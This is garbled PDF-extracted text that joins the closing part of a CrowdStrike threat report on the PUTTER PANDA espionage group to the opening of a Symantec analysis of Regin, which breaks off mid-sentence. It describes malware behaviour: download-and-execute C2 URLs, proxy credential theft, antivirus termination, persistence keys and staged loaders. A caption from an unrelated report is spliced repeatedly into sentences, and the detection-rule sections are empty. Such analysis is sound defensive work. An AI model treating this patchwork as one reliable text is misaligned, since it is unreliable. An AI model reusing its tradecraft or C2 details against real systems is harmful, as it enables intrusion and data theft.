to be used as a second - stage tool , or as a failsafe means for the attackers to regain basic access to a
compromised system ( which is consistent with its support for sleeping until a certain date / time ) . Some of the
supported commands are implemented using C++ classes derived from a base CCommand class :
•C CommandAttribe – Retrieve metadata for files on disk , or set certain attributes such as creation/
modification timestamps .
• CCommandCD – Change the working directory for the current C2 session .
•C CommandCMD – Execute a command , with standard input / output / error Screenshot of Truecaller
redirected over the C2 channel .                                                Database Shared by
• CCommandNOP – List the current working directory .                              DEADEYE JACKAL on Their
Twitter Account ( names
redacted )
However , other commands are not implemented in this way . These other commands contain functionality to :
• Pause C2 activity for a random time interval .
• Shutdown C2 activity and exit .
•P rovide a date and time before which beaconing will not resume , recorded in the file C:\RECYCLER\
restore.dat as noted above .
The use of C++ classes that inherit from a base class to carry out some of the tasking commands , along
with the use of concurrency features , indicates that the developers of the RAT put some thought into the
architecture and design of their tool , although the decision to implement some commands outside of the
class - based framework is curious , and may indicate multiple developers worked on the RAT ( or a single
developer with shifting preferences for his coding style ) .
32
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
PNGDOWNER – EXAMPLE MD5 HASH
687424F0923DF9049CC3A56C685EB9A5
The pngdowner malware is a simple tool constructed using Microsoft Visual Studio and implemented via single
C++ source code file . This sample contains a PDB path of Y:\Visual Studio 2005\Projects\branch - downer\
downer\Release\downer.pdb , but other similar paths Z:\Visual Studio 2005\Projects\pngdowner\Release\
pngdowner.pdb and Z:\Visual Studio 2005\Projects\downer\Release\downer.pdb have also been observed
in other samples . Appendix 3 lists metadata for known pngdowner samples .
Initially , the malware will perform a connectivity check to a hard - coded URL ( http://www.microsoft.com ) ,
using a constant user agent Mozilla/4.0 ( Compatible ; MSIE 6.0 ; ) . If this request fails , the malware will attempt to
extract proxy details and credentials from Windows Protected Storage , and from the IE Credentials Store using
publicly known methods15 , using the proxy credentials for subsequent requests if they enable outbound HTTP
access . An initial request is then made to the hard - coded C2 server and initial URI – forming a URL of the form
( in this sample ) http://login.stream-media.net/files/xx11/index.asp?95027775 , where the numerical parameter
represents a random integer . A hard - coded user agent of myAgent is used for thisScreenshot         of Truecaller
request , and     subsequent
Database Shared by
communication with the C2 server .
DEADEYE JACKAL on Their
Twitter Account ( names
Content returned from this request to the C2 server will be saved to a file named index.dat in the user ’s
redacted )
temporary directory ( i.e. , % TEMP% ) . This file is expected to contain a single line , specifying a URL and a
filename . The malware will then attempt to download content from the specified URL to the filename within
the user ’s temporary directory , and then execute this file via the WinExec API . If this execution attempt
succeeds , a final C2 request will be made – in this case to a URL using the same path as the initial request ( and
a similarly random parameter ) , but with a filename of success.asp . Content returned from this request will be
saved to a file , but then immediately deleted . Finally , the malware will delete the content saved from the first
request , and exit .
The limited functionality , and lack of persistence of this tool , implies that it is used only as a simple download-
and - execute utility . Although the version mentioned here uses C++ , along with Visual Studios Standard
Template Library ( STL ) , older versions of the RAT ( such as MD5 hash b54e91c234ec0e739ce429f47a317313 ) , built
in 2011 , use plain C. This suggests that despite the simple nature of the tool , the developers have made some
attempts to modify and perhaps modernize the code . Both versions contain debugging / progress messages
such as “ down file success ” . Although these are not displayed to the victim , they were likely used by the
developers as a simple means to verify functionality of their code .
33
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
HTTPCLIENT – EXAMPLE MD5 HASH
544FCA6EB8181F163E2768C81F2BA0B3
Like pngdowner , the httpclient malware is a simple tool that provides a limited range of functionality and uses
HTTP for its C2 channel . This malware also initially performs a connectivity check to www.microsoft.com using
the hard - coded user agent Mozilla/4.0 ( Compatible ; MSIE 6.0 ; ) , although in this variant no attempt is made to
extract proxy credentials .
The malware will then connect to its configured C2 infrastructure ( file.anyoffice.info ) and perform a HTTP
request of the form shown in Figure 14 below :
Screenshot of Truecaller
Figure 14 . HttpClient
Database Shared by
Sample Beacon
DEADEYE JACKAL on Their
Twitter Account ( names
redacted )
Content returned from the C2 server is deobfuscated by XOR’ing the content with a single byte , 0x12 . The
decoded data is then checked for the string runshell . If this string is not present , the C2 request is repeated
every 0.5 seconds . Otherwise , a shell process is started ( i.e. , cmd.exe ) , with input / output redirected over the C2
channel . Shell commands from the server are followed by an encoded string $ $ $ , which indicates that the shell
session should continue . If the session is ended , two other commands are supported : m2b ( upload file ) and
b2 m ( download file ) .
Slight variations on the C2 URLs are used for different phases of the C2 interaction :
• Shell command : /Microsoft / errorpost < random number>/default.asp?tmp=<encoded hostname >
• Shell response : /MicrosoftUpdate / GetUpdate / KB < random number>/default.asp?tmp=<encoded hostname >
Both methods are detailed here : http://securityxploded.com/iepasswordsecrets.php
15
34
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Given the lack of a persistence mechanism and low level of sophistication , it is likely that httpclient – like
pngdowner – is used as a second - stage or supplementary / backup tool . Appendix 4 lists metadata for
observed httpclient samples .
DROPPERS – RC4 AND XOR BASED
Other CrowdStrike reporting describes a dropper used by PUTTER PANDA ( abc.scr ) to install the 4H RAT . This
dropper uses RC4 to decrypt an embedded payload from data in an embedded resource before writing the
payload to disk and executing it . Several instances of this dropper have been observed , most commonly in
association with the 4H RAT , but also in relation to other tools that will be described in forthcoming reporting .
Another dropper has been observed , exclusively installing the pngdowner malware ( example MD5 hash
4c50457c35e2033b3a03fcbb4adac7b7 ) . This dropper is simplistic in nature , and is compiled from a single C++
source code file . It contains a Word document in plaintext ( written to Bienvenue_a_Sahaja_Yoga_Toulouse .
doc ) , along with an executable ( Update.exe ) and DLL ( McUpdate.dll ) . The executable and DLL are both
contained within the .data section of the dropper , obfuscated with a 16-byte XOR key ( consisting of the bytes
0xA0 – 0xAF ) .                                                                           Screenshot of Truecaller
Database Shared by
DEADEYE JACKAL on Their
Both the document and executable are written to disk and the executed via the ShellExecute              API ( using the
Twitter Account ( names
verb “ open ” ) . The executable is also installed into the ASEP registry key HKCU\Software\Microsoft\Windows\
redacted )
CurrentVersion\Run , with a value named McUpdate . Finally , the dropper deletes itself via a batch file .
The dropped executable ( MD5 hash 38a2a6782e1af29ca8cb691cf0d29a0d ) primarily aims to inject
the specified DLL ( McUpdate.dll , MD5 hash 08c7b5501df060ccfc3aa5c8c41b452f ) into a process that
would normally be accessing the network , likely in order to disguise the malicious activity . Module names
corresponding to Outlook Express ( msinm.exe ) , Outlook ( outlook.exe ) , Internet Explorer ( iexplore.exe ) , and
Firefox ( firefox.exe ) are used . If Internet Explorer is used , then the malware will attempt to terminate processes
corresponding to two components of Sophos Anti - Virus ( SAVAdminService.exe and SavService.exe ) .
Four examples of these droppers were located , using a mixture of decoy PDF and Microsoft Word documents
( shown below in Figures 15 - 18 ) . The common theme throughout these documents is space technology
( Bienvenue_a_Sahaja_Yoga_Toulouse.doc does not follow this trend , but could be targeted at workers at the
Toulouse Space Centre , the “ largest space centre in Europe ” ) , indicating that the attackers have a keen
interest in this sector , which is also reflected in the choice of name for some of the C2 domains used ( see the
Attribution section above ) .
The API used expects a parameter of the form char * * , and is given a char * pointer to the “ * / * ” string , but the stack data following this
16
pointer is not properly zeroed or cleansed before use , leading to uncontrolled memory being read as other strings .
35
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Figure 15 . “ In-
vitation_Pleia-
des_012012.doc ”
Dropped by a4e4b-
3ceb949e8494968c-
71fa840a516
Screenshot of Truecaller
Database Shared by
DEADEYE JACKAL on Their
Twitter Account ( names
redacted )
Figure 16 . “ Bien-
venue_a_Sahaja _
Yoga_Toulouse.doc ”
Dropped by
4c50457c35e-
2033b3a03fcbb4ad-
ac7b7
36
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Figure 17 . “ 50th AIAA
Satellite Sciences
Conference.pdf ”
from 6022cf1f-
cf2b478bed8da1fa3e-
996ac5
Screenshot of Truecaller
Database Shared by
DEADEYE JACKAL on Their
Twitter Account ( names
redacted )
Figure 18 : “ Proj-
ect - Manager - Job-
Description - Sur-
rey - Satellite - Tech-
nology - world - lead-
er - provision - small - sat-
ellite - solutions .
pdf ” Dropped by
9cb6103e9588d506cf-
d81961ed41eefe
37
Mitigation & Remediation
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
MITIGATION & REMEDIATION
A number of specific and generic
detection methods are possible for
this RAT , both on a host and on the
network . These are detailed below ,
and are designed to expand upon
the indicators reported in other
CrowdStrike reporting .                                                               Screenshot of Truecaller
Database Shared by
DEADEYE JACKAL on Their
REGISTRY ARTIFACTS                                                              Twitter Account ( names
The following Windows registry artifacts are indicative of a compromised host : redacted )
• ASEP registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run , and value named McUpdate
FILE SYSTEM ARTIFACTS
The presence of the following file system artifacts is indicative of a compromised host :
• ssdpsvc.dll , msacem.dll , or mrpmsg.dll
• C:\RECYCLER\restore.dat
• % TEMP%\index.dat
HOST INDICATORS
A file mapping named & * SDKJfhksdf89*DIUKJDSF&*sdfsdf78sdfsdf also indicates the victim machine is
compromised with PUTTER PANDA malware .
39
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Yara Rules
40
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
41
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
42
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
43
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
NETWORK SIGNATURES
In addition the domains listed in the Appendices and in the Attribution section , the generic signatures below
can be used to detect activity from the malware described in this report .
Snort Rules
Screenshot of Truecaller
Database Shared by
DEADEYE JACKAL on Their
Twitter Account ( names
redacted )
44
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Screenshot of Truecaller
Database Shared by
DEADEYE JACKAL on Their
Twitter Account ( names
redacted )
45
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
TTPS
In addition to the indicators described above , PUTTER PANDA have some distinct generic TTPs :
• Distinctive connectivity checks to www.google.com
• Use of the HashData API to derive key material for authentication and encryption
• Use of the ASEP registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run
• Deployment of space industry - themed decoy documents during malware installations
Screenshot of Truecaller
Database Shared by
DEADEYE JACKAL on Their
Twitter Account ( names
redacted )
46
Conclusion
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Conclusion
PUTTER PANDA are a determined adversary group who have been operating
for several years , conducting intelligence - gathering operations with a
significant focus on the space sector . Although some of their tools are
simplistic , taken as a whole their toolset provides a wide degree of control
over a victim system and can provide the opportunity to deploy additional
tools at will .
Research presented in this report shows that the PUTTER PANDA operators are
likely members of the 12th Bureau , 3rd General Staff Department
Screenshot(GSD )        of
of Truecaller
Database Shared by
the People ’s Liberation Army ( PLA ) , operating from the unit ’s headquarters
DEADEYE JACKAL on Their
Twitter Account ( names
in Shanghai with MUCD 61486 . Strategic objectives for this unit     are likely
redacted )
to include obtaining intellectual property and industrial secrets relating to
defense technology , particularly those to help enable the unit ’s suspect
mission to conduct space surveillance , remote sensing , and interception of
satellite communications . PUTTER PANDA is likely to continue to aggressively
target Western entities that hold valuable information or intellectual property
relevant to these interests .
The detection and mitigation guidance given in this report will help to
minimize the risk of a successful compromise by these actors , and future
CrowdStrike reports will examine other elements of the PUTTER PANDA toolset .
48
Appendices
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
APPENDIX 1 : 4H RAT SAMPLE METADATA
Screenshot of Truecaller
Database Shared by
DEADEYE JACKAL on Their
Twitter Account ( names
redacted )
50
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
51
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
52
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
APPENDIX 2 : 3PARA RAT SAMPLE METADATA
Screenshot of Truecaller
Database Shared by
DEADEYE JACKAL on Their
Twitter Account ( names
redacted )
53
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
APPENDIX 3 : PNGDOWNER SAMPLE METADATA
Screenshot of Truecaller
Database Shared by
DEADEYE JACKAL on Their
Twitter Account ( names
redacted )
54
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Screenshot of Truecaller
Database Shared by
DEADEYE JACKAL on Their
Twitter Account ( names
redacted )
55
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
56
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
APPENDIX 4 : HTTPCLIENT SAMPLE METADATA
Screenshot of Truecaller
Database Shared by
DEADEYE JACKAL on Their
Twitter Account ( names
redacted )
57
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
CrowdStrike
Falcon                                                       Falcon
Intelligence                                                 Intelligence
CrowdStrike Falcon Intelligence portal provides              Benefits
enterprises with strategic , customized , and actionable
intelligence . Falcon Intelligence enables organizations      Incorporate Actionable Intelligence
to prioritize resources by determining targeted              Feeds into your existing enterprise
versus commodity attacks , saving time and focusing           security infrastructure to identify
resources on critical threats . With unprecedented            advanced attackers speci!c to your
insight into adversary tools , tactics , and procedures        organization and industry
( TTPs ) and multi - source information channels , analysts
can identify pending attacks and automatically feed          Rapidly integrate Falcon Intelligence
threat intelligence via API to SIEM and thirdparty
into custom work”ows and SEIM
deployments with a web - based API
security tools .
Quickly understand the capabilities
Access to CrowdStrike Falcon Intelligence is geared
and artifacts of targeted attacker
toward all levels of an organization , from the
tradecra # with In - depth technical
executivewho needs to understand the business threat
analysis
and strategic business impact , to the front - line securiyt
professional struggling to ! ght through an adversary ’s
Gain visibility into breaking events
attack against the enterprise .
that matter to an organization ’s
brand , infrastructure , and customers
CrowdStrike Falcon Intelligence is a web - based               Interact with the Intelligence team
intelligence subscription that includes full access to a     and leverage customized Cyber
variety of feature sets , including :                          Threat Intelligence feedback during
• Detailed technical and strategic analysis of              Quarterly Executive Brie!ngs
50+adversaries’ capabilities , indicators and               Provide malware samples and
tradecra!,attribution , and intentions                      receive customized and actionable
intelligence reporting
• Customizable feeds and API for indicators of
compromise in a wide variety of formats                    Access the Adversary Pro!le Library
to gain in - depth information into
• Tailored Intelligence that provides                       50 + adversary groups , to include
visibility into breaking events that matter to             capabilities and tradecra # and tradecraft
an organization ’s brand ,
58
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
CrowdStrike Falcon Host                                   Falcon Host Key Features
• Endpoint threat detection and response solution
CrowdStrike Falcon Host is an endpoint threat
• Cloud - managed application with easily deployed sensors for
detection and response product that identifies
Mac & Windows
unknown malware , detects zero - day threats , and
• Kernel - mode sensors requires no reboot on updates . Less
prevents damage from targeted attacks in real - time .
than 2 MB footprint executable
Falcon Host is comprised of two core components ,
• Detects attacks based on adversary activity
the cloud - based management console and the
• Integrates with existing security architecture and SIEM tools
on - premises host - based sensor that continuously
through Falcon Host APIs
monitors threat activity at the endpoint to prevent
damage in real - time .
Technology Drivers :
Stateful Execution inspection
Falcon Host leverages a lightweight kernel - mode
Stateful Execution Inspection ( SEI ) tracks execution state and
sensor that shadows , captures , and correlates low-
links together various stages of the kill chain , from initial code
level operating system events to instantly identify
execution to data exfiltration .
the adversary tradecraft and activities through
Stateful Execution Inspection ( SEI ) at the endpoint
CrowdStrike ’s Real - time Stateful Execution Engine performs
and Machine Learning in the cloud . As opposed
inspection and analysis to understand the full context of a
to focusing on malware signatures , indicators of
cyber attack . SEI is critical to understanding the entire
compromise , exploits , and vulnerabilities , Falcon Host
attack life cycle and preventing the damage from advanced
instead identifies mission objectives of the adversary
malware and targeted attacks . Existing security technologies
leveraging the Kill Chain model and provides realtime
that focus solely on malware signatures , incidators of
detection by focusing on what the attacker is
compromise , exploits , and vulnerabilities
doing , as opposed to looking nfor a specific ,
fail to protect against the majority of attacks as they are blind
easily changeable indicator used in an attack .
to the full scope of adversary activity .
Without performing intrusive and performance-
Benefits
impacting scans of the system , Falcon Host ’s highly
• Identify and protect against damage from determined
efficient real - time monitoring of all system activity
attackers who are undetected by existing passive
is the only security solution that provides maximum
defense solutions
visibility into all adversary activities , including
• Understand who is attacking you , why and what they want
Adversary - in - Motion : reconnaissance , exploitation ,
to steal or damage
privilege escalation , lateral movement , and
• Alert and stop exfiltration of sensitive information from
exfiltration .
compromised machines Protect remote users when they
are outside of the corporate network
Falcon Host delivers insight into past and current
• Protect remote users when they are outside of the
attacks not only on a single host , but also across
corporate network
devices and networks .
• No on - premises equipment needed , reducing overall
total cost of ownership
59
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
About CrowdStrike
CrowdStrike is a global provider of security technology and services focused on
identifying advanced threats and targeted attacks . Using big - data technologies ,
CrowdStrike ’s next - generation threat protection platform leverages real - time
Stateful Execution Inspection ( SEI ) at the endpoint and Machine Learning
in the cloud instead of solely focusing on malware signatures , indicators of
compromise , exploits , and vulnerabilities . The CrowdStrike Falcon Platform
is a combination of big data technologies and endpoint security driven by
advanced threat intelligence . CrowdStrike Falcon enables enterprises to identify
unknown malware , detect zero - day threats , pinpoint advanced adversaries and
attribution , and prevent damage from targeted attacks in real time .
About CrowdStrike Services
CrowdStrike Services is a wholly owned subsidiary of CrowdStrike responsible
for proactively defending against and responding to cyber incidents with pre
and post Incident Response services . CrowdStrike ’s seasoned team of Cyber
Intelligence professionals , Incident Responders , and Malware Researchers
consists of a number of internationally recognized authors , speakers , and experts
who have worked on some of the most publicized and challenging intrusions and
malware attacks in recent years . The CrowdStrike Services team leverages our
Security Operations Center to monitor the full CrowdStrike Falcon Platform and
provide cutting - edge advanced adversary intrusion detection services . The full
spectrum of proactive and response services helps customers respond tactically
as well as continually mature and strategically evolve Incident Response
program capabilities .
60
For more information on the intelligence provided in this report or on
any of the 70 + actors tracked by the CrowdStrike Global Intelligence team ,
contact us at intelligence@crowdstrike.com
To learn more about the CrowdStrike Falcon Platform or
CrowdStrike Services , contact us at sales@crowdstrike.com .
www.crowdstrike.com | @CrowdStrike

SECURITY RESPONSE
Regin : Top - tier espionage tool
enables stealthy surveillance
Symantec Security Response
﻿﻿
Version 1.0 – November 24 , 2014
Regin is an extremely complex piece of software that can be
customized with a wide range of different capabilities that
can be deployed depending on the target .
CONTENTS
OVERVIEW ...................................................................... 3
Introduction ................................................................... 5
Timeline .......................................................................... 5
Target profile .................................................................. 6
Infection vector ........................................................ 6
Architecture ................................................................... 8
Stage 0 ( dropper ) ..................................................... 9
Stage 1 ...................................................................... 9
Stage 2 ...................................................................... 9
Stage 3 ...................................................................... 9
Stage 4 ............................................................ 	 11
Stage 5 .................................................................... 11
Encrypted virtual file system containers 	 �������������� 11
Command - and - control operations ......................... 12
Logging ................................................................... 12
Payloads ....................................................................... 14
64-bit version ............................................................... 15
File names .............................................................. 15
Stage differences ................................................... 15
Conclusion .................................................................... 16
Protection ..................................................................... 16
Appendix ...................................................................... 18
Data files ................................................................ 18
Indicators of compromise ............................................ 20
File MD5s ................................................................ 20
File names / paths .................................................... 20
Extended attributes ............................................... 21
Registry .................................................................. 21
OVERVIEW
In the world of malware threats , only a few rare examples can truly be considered
groundbreaking and almost peerless . What we have seen in Regin is just such a class of
malware .
Regin is an extremely complex piece of software that can be customized with a wide
range of different capabilities which can be deployed depending on the target . It is built
on a framework that is designed to sustain long - term intelligence - gathering operations
by remaining under the radar . It goes to extraordinary lengths to conceal itself and its
activities on compromised computers . Its stealth combines many of the most advanced
techniques that we have ever seen in use .
The main purpose of Regin is intelligence gathering and it has been implicated in data
collection operations against government organizations , infrastructure operators ,
businesses , academics , and private individuals . The level of sophistication and complexity
of Regin suggests that the development of this threat could have taken well - resourced
teams of developers many months or years to develop and maintain .
Regin is a multi - staged , modular threat , meaning that it has a number of components ,
each depending on others , to perform attack operations . This modular approach gives
flexibility to the threat operators as they can load custom features tailored to individual
targets when required . Some custom payloads are very advanced and exhibit a high
degree of expertise in specialist sectors . The modular design also makes analysis of the
threat difficult , as all components must be available in order to fully understand it . This
modular approach has been seen in other sophisticated malware families such as Flamer
and Weevil ( The Mask ) , while the multi - stage loading architecture is similar to that seen
in the Duqu / Stuxnet family of threats .
Regin is different to what are commonly referred to as “ traditional ” advanced persistent
threats ( APTs ) , both in its techniques and ultimate purpose . APTs typically seek specific
information , usually intellectual property . Regin ’s purpose is different . It is used for the
collection of data and continuous monitoring of targeted organizations or individuals .
This report provides a technical analysis of Regin based on a number of identified
samples and components . This analysis illustrates Regin ’s architecture and the many
payloads at its disposal .
INTRODUCTION
Regin has a wide
range of standard
capabilities ,
particularly around
monitoring targets
and stealing data .
Regin : Top - tier espionage tool enables stealthy surveillance
Introduction
Regin is a multi - purpose data collection tool which dates back several years . Symantec first began looking into
this threat in the fall of 2013 . Multiple versions of Regin were found in the wild , targeting several corporations ,
institutions , academics , and individuals .
Regin has a wide range of standard capabilities , particularly around monitoring targets and stealing data . It also
has the ability to load custom features tailored to individual targets . Some of Regin ’s custom payloads point to a
high level of specialist knowledge in particular sectors , such as telecoms infrastructure software , on the part of
the developers .
Regin is capable of installing a large number of additional payloads , some highly customized for the targeted
computer . The threat ’s standard capabilities include several remote access Trojan ( RAT ) features , such as
capturing screenshots and taking control of the mouse ’s point - and - click functions . Regin is also configured to
steal passwords , monitor network traffic , and gather information on processes and memory utilization . It can
also scan for deleted files on an infected computer and retrieve them . More advanced payload modules designed
with specific goals in mind were also found in our investigations . For example , one module was designed to
monitor network traffic to Microsoft Internet Information Services ( IIS ) web servers , another was designed
to collect administration traffic for mobile telephony base station controllers , while another was created
specifically for parsing mail from Exchange databases .
Regin goes to some lengths to hide the data it is stealing . Valuable target data is often not written to disk . In
some cases , Symantec was only able to retrieve the threat samples but not the files containing stolen data .
Timeline
Symantec is aware of two distinct versions of Regin . Version 1.0 appears to have been used from at least 2008 to
2011 . Version 2.0 has been used from 2013 onwards , though it may have possibly been used earlier .
Version 1.0 appears to have been abruptly withdrawn from circulation in 2011 . Version 1.0 samples found after
this date seem to have been improperly removed or were no longer accessible to the attackers for removal .
This report is based primarily on our analysis of Regin version 1.0 . We also touch on version 2.0 , for which we
only recovered 64-bit files .
Symantec has assigned these version identifiers as they are the only two versions that have been acquired . Regin
likely has more than two versions . There may be versions prior to 1.0 and versions between 1.0 and 2.0 .
Page 5
Regin : Top - tier espionage tool enables stealthy surveillance
Target profile
The Regin operators do not appear to
focus on any specific industry sector .
Regin infections have been observed
in a variety of organizations ,
including private companies ,
government entities , and research
institutes .
Infections are also geographically
diverse , having been identified
mainly in 10 different regions .
Infection vector
The infection vector varies among
targets . A reproducible infection
vector is unconfirmed at time of
writing . Targets may be tricked into
visiting spoofed versions of well-
known websites and the threat may
be installed through a web browser
or by exploiting an application . On
one computer , log files show that
Regin originated from Yahoo ! Instant
Messenger through an unconfirmed
exploit .
Figure 1 . Confirmed Regin infections by sector
Figure 2 . Confirmed Regin infections by country
Page 6
ARCHITECTURE
The initial Stage 1
driver is the only
plainly visible code
on the computer .
All other stages are
stored as encrypted
data blobs ...
Regin : Top - tier espionage tool enables stealthy surveillance
Architecture
Regin has a six - stage architecture . The initial         Table 1 . The six stages of Regin
stages involve the installation and configuration
of the threat ’s internal services . The later stages     Stages           Components
bring Regin ’s main payloads into play . This             Stage 0          Dropper . Installs Regin onto the target computer
section presents a brief overview of the format
Stage 1          Loads driver
and purpose of each stage . The most interesting
stages are the executables and data files stored        Stage 2          Loads driver
in Stages 4 and 5 . The initial Stage 1 driver is        Stage 3          Loads compression , encryption , networking , and han-
the only plainly visible code on the computer . All                      dling for an encrypted virtual file system ( EVFS ) .
other stages are stored as encrypted data blobs ,
Stage 4          Utilizes the EVFS and loads additional kernel mode
as a file or within a non - traditional file storage
drivers , including payloads .
area such as the registry , extended attributes , or
raw sectors at the end of disk .                         Stage 5          Main payloads and data files
Figure 3 . Regin ’s architecture
Page 8
Regin : Top - tier espionage tool enables stealthy surveillance
Stage 0 ( dropper )
Symantec Security Response has not obtained the Regin dropper at the time of writing . Symantec believes that
once the dropper is executed on the target ’s computer , it will install and execute Stage 1 . It ’s likely that Stage
0 is responsible for setting up various extended attributes and/or registry keys and values that hold encoded
versions of stages 2 , 3 , and potentially stages 4 and onwards . The dropper could be transient rather than acting
as an executable file and may possibly be part of the infection vector exploit code .
Stage 1
Stage 1 is the initial load point for the threat . There are two known Stage 1 file names :
• 	  usbclass.sys ( version 1.0 )
• 	  adpu160.sys ( version 2.0 )
These are kernel drivers that load and execute Stage 2 . These kernel drivers may be registered as a system
service or may have an associated registry key to load the driver while the computer is starting up .
Stage 1 simply reads and executes Stage 2 from a set of NTFS extended attributes . If no extended attributes are
found , Stage 2 is executed from a set of registry keys .
Stage 2
Stage 2 is a kernel driver that simply extracts , installs and runs Stage 3 . Stage 2 is not stored in the traditional
file system , but is encrypted within an extended attribute or a registry key blob .
Stage 2 can be found encrypted in :
Extended attribute
• 	  % Windir%
• 	  % Windir%\fonts
• 	  % Windir%\cursors ( possibly only in version 2.0 )
Registry subkey
• 	  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4F20E605 - 9452 - 4787-B793-
D0204917CA58 }
• 	  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\RestoreList\VideoBase ( possibly only in version
2.0 )
This stage can also hide running instances of Stage 1 . Once this happens , there are no remaining plainly visible
code artifacts . Similar to previous stages , Stage 2 finds and loads an encrypted version of Stage 3 from either
NTFS extended attributes or a registry key blob .
Stage 2 can also monitor the state of the threat . This stage drops the file msrdc64.dat , which appears to always
be 512 bytes in size . The first two bytes are used and the remaining bytes are set to zero . The second byte
indicates the exclusive maximum number of instances allowed to run , which is set to two . This means no more
than one instance should run at any time . The first byte indicates how many instances were run or attempted to
run . Therefore , the potential combinations for the first two bytes are :
• 	  00 02 ( the threat is not running )
• 	  01 02 ( the threat is running )
• 	  02 02 ( the threat was running and a second instance has started ) .
Stage 3
Stage 3 is a kernel mode DLL and is not stored in the traditional file system . Instead , this file is encrypted within
an extended attribute or registry key blob .
Page 9
Regin : Top - tier espionage tool enables stealthy surveillance
Stage 3 can be found in the following locations :
Extended attribute
• 	  % Windir%\system32
• 	  % Windir%\system32\drivers
Registry subkey
• 	  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4F20E605 - 9452 - 4787-B793-
D0204917CA5A }
The file is six to seven times the size of the driver in Stage 2 . In addition to loading and executing Stage 4 , Stage
3 offers a framework for the higher level stages .
Stages 3 and above are based on a modular framework of code modules . These modules offer functions through
a private , custom interface . Each file in stages 3 and above can “ export ” functionality to other parts of Regin .
In the case of Stage 3 , the following primitives are offered :
• 	  The orchestrator , which parses custom records found in the appended data of the executable files for stages
3 and above . These records contain a list of Regin functionalities to be executed . A record starts with the
number 0xD912FEAB ( little - endian ordering )
• 	  Compression and decompression routines
• 	  Encryption and decryption routines
• 	  Routines to retrieve storage locations of higher - level ( Stage 4 ) components
• 	  Routines to handle an encrypted virtual file system used by Stage 4
• 	  Network primitives
These primitives are provided through a custom export methodology .
Export methodology
The Stage 3 DLL exports a wide range         Table 2 . An example of Regin ’s methods organized into 12 groups
of functionality through a custom
export methodology . The interface used        Major                            Functionality
to export functionality does not make         0001h                            Core
use of the traditional Windows DLL
000Dh                            Compression , decompression
export mechanism by name or ordinal .
000Fh                            Encryption , decryption
Exported Regin methods are referenced
003Dh                            EVFS handling
by a tuple consisting of a major
and minor number . Stage 3 exports             0007h                            Container management
hundreds of methods , organized                000Bh                            Log management
into 12 different major groups . The
numbers used vary across versions . We         0033h                            Loader
acquired artifacts using two different        0011h                            Network
numbering schemes . Table 2 is an
example listing .                              0013h                            Network
C373h                            TCP command - and - control ( C&C )
With Regin ’s modular nature , Stage
4 kernel modules and Stage 5 user             0019h                            UDP C&C
modules ( payloads ) can provide                0009h                            C&C Processor
functionality and export routines using
the same major and minor numbering
scheme .
Page 10
Regin : Top - tier espionage tool enables stealthy surveillance
Stage 4
The files for Stage 4 , which are loaded by Stage 3 , consist of a user - mode orchestrator and multiple kernel
payload modules . They are stored in two EVFS containers as files :
• 	  % System%\config\SystemAudit . Evt : Contains Stage 4 kernel drivers , which constitute the kernel mode part of
Regin ’s payload .
• 	  % System%\config\SecurityAudit . Evt : Contains a user mode version of Stage 3 . The files are injected into
services.exe .
When the attackers who operated Regin cleaned up compromised computers once they were finished with them ,
they often failed to remove Stage 4 and 5 artifacts from the system .
Stage 4 also uses the same export methodology described in Stage 3 .
Stage 5
Stage 5 consists of the main Regin payload functionality . The files for Stage 5 are injected into services.exe by
Stage 4 .
Stage 5 files are EVFS containers containing other files :
• 	  % System%\config\SystemLog.evt : Contains Stage 5 user mode DLLs . They constitute Regin ’s payload .
• 	  % System%\config\SecurityLog.evt : Contains Stage 5 data files , used by the Stage 4 and 5 components to
store various data items
• 	  % System%\config\ApplicationLog.evt : Another Stage 5 log container , which is
referenced by Stage 5 data files
• 	  % Windir%\ime\imesc5\dicts\pintlgbp.imd ( version 2.0 )
• 	  % Windir%\ime\imesc5\dicts\pintlgbs.imd ( version 2.0 )
Regin ’s payload involves the DLLs contained in the SystemLog.evt EVFS container .
The payload functionality differs depending on the targeted computer . Custom
payload files will likely be delivered for each specific environment . Example payload
functionality seen to date includes :
• 	  Sniffing low - level network traffic
• 	  Exfiltrating data through various channels ( TCP , UDP , ICMP , HTTP )
• 	  Gathering computer information
• 	  Stealing passwords
• 	  Gathering process and memory information
• 	  Crawling through the file system
• 	  Low level forensics capabilities ( for example , retrieving files that were deleted )
• 	  UI manipulation ( remote mouse point & click activities , capturing screenshots , etc . )
• 	  Enumerating IIS web servers and stealing logs
• 	  Sniffing GSM BSC administration network traffic
Encrypted virtual file system containers
Regin stores data files and payloads on disk in encrypted virtual file system files . Such
files are accessed by the major routines 3Dh . Files stored inside EVFS containers are
encrypted with a variant of RC5 , using 64-bit blocks and 20 rounds . The encryption
mode is reverse cipher feedback ( CFB ) .
Known extensions for EVFS containers are * .evt and * .imd . The structure of a
